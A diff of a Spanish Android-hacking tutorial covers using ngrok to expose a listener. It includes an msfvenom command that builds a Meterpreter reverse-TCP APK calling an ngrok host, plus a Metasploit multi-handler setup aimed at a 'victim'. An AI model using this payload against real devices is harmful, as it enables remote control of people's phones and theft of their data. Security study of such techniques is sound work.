@@ -48,7 +48,7 @@ Esto sirve para poder usar la VM así que no nos queda más remedio que hacerlo.
 
 ![rootReboot](/images/apuntes/HackingAndroid/rootReboot.png)
 
-  * Podemos comprobar si efectivamente tenemos el dispositivo rooteado con la app **"root checker"**.
+  * Podemos comprobar si efectivamente tenemos el dispositivo rooteado con la app **"Root Checker"**.
 
 ![rootChecker](/images/apuntes/HackingAndroid/rootChecker.png)
 
@@ -67,20 +67,21 @@ Como saben, no soy partidario de usar Metasploit (ni me gusta) pero en el caso d
 
 Con ```"NGROK"``` podemos levantar un servidor para que la víctima descarge nuestra APK maliciosa. Tenemos primero que registrarnos en la página web para que se sincronice la cuenta con la de la app y usar el apiToken.  
 Páginas de descarga de NGROK:  
-    [https://ngrok.com/](https://ngrok.com/)
+    [https://ngrok.com/](https://ngrok.com/)  
     [https://github.com/inconshreveable/ngrok](https://github.com/inconshreveable/ngrok)
 * ngrok http 4343 => Para levantar un servidor web (podríamos crear por ejemplo una página web, clonada o creada con un enlace a nuestro malware)
-* ngrok tcp 4343 => Para levantar un servidor TCP (cuando la víctima abra nuestra aplicación maliciosa, esta se conectará a la dirección que nos aportó **ngrok** redireccionándola a nuestra ip local con el puerto que le indicamos, donde vamos a estar nosotros a la escucha para establecer la conexión).
+* ngrok tcp 4343 => Para levantar un servidor TCP y que nuestro payload se conecte directamente a esta dirección que nos proporciona **NGROK** redireccionándolo a nuestra IP y puerto local.
   * http => Levantar un servidor http público (de cara a internet sin tener que abrir puertos en nuestro router ni exponer nuestra ip pública).
-  * tcp => Levanta un túnel en el que viaja tráfico TCP para que la víctima pueda descargar nuestro malware.
+  * tcp => Levanta un túnel entre la red y nuestra red interna para que nuestro payload pueda conectarse directamente a nuestra red local.
   * 4343 => El puerto que YO le he asignado (vosotros podéis elegir el puerto que queráis).
 
 ![ngrok](/images/apuntes/HackingAndroid/ngrok.png)
 
+Explico un poco lo que aparece en esta imagen:
 * Session Status => El estado de la sesión.
 * Account => El nombre de la cuenta y tu plan (El plan "Free" no permite tener más de un servidor de ngrok levantado al mismo tiempo)
 * Version => La versión de ngrok que estamos corriendo.
-* Region => La región donde está establecido el túnel.
+* Region => La región donde está establecido ngrok.
 * Web Interface => Una interfaz web con algo más de información de lo que aparece ahí.
 
 ![ngrokWeb](/images/apuntes/HackingAndroid/ngrokWeb.png)
@@ -88,19 +89,19 @@ Páginas de descarga de NGROK:
 * Forwarding => Nos indica la dirección que tenemos que poner en nuestro payload para que se redireccione a nuestra IP local y el puerto que le indicamos (donde previamente estaremos a la escucha con el multi-handler).
 * Connections => Las conexiones que hemos recibido.
 
-Con ```"msfvenom"``` podemos crear una APK maliciosa, para ello ejecutamos el siguiente comando.  
+Con **"msfvenom"** podemos crear una APK maliciosa, para ello ejecutamos el siguiente comando.  
 ```msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=17547 -o reverse.apk```
 
 * -p => Indica que tipo de payload queremos usar.
   * android/meterpreter/reverse_tcp => Es de android, que sea mediante **"Metasploit"** con una sesión de **"meterpreter"** y una shell reversa por TCP.
-* LHOST => Debemos de indicarle la dirección que nos ha dado ngrok (sin el **"tcp://"** ni el puerto **":17547"**).
+* LHOST => Debemos indicarle la dirección que nos ha dado ngrok (sin el **"tcp://"** ni el puerto **":17547"**).
 * LPORT => Le pasamos el puerto que nos ha dado ngrok (solo el puerto).
 * -o => Le indicamos el nombre del fichero saliente que vamos a crear.
 
 ![msfvenom](/images/apuntes/HackingAndroid/msfvenomBasic.png)
 
-Una vez hecho todo esto solo deberíamos dejar en escucha un multi-handler de metasploit escuchando en todas las IPs (0.0.0.0) y el puerto que le dijimos nosotros a ngro (el local).
->Todo esto lo vamos a ver más en detalle en el apartado "Ejecución de exploit en la víctima"
+Una vez hecho todo esto solo deberíamos dejar en escucha un multi-handler de metasploit escuchando en todas las IPs (0.0.0.0) y el puerto que le dijimos nosotros a ngrok (el local).
+>Todo esto lo vamos a ver más en detalle en el apartado [Ejecución de exploit en la víctima](#ejecucion-de-exploit-en-la-victima)
 
 <a name="crear-apk-maliciosa-original"></a>
 ## Crear APK maliciosa "original"
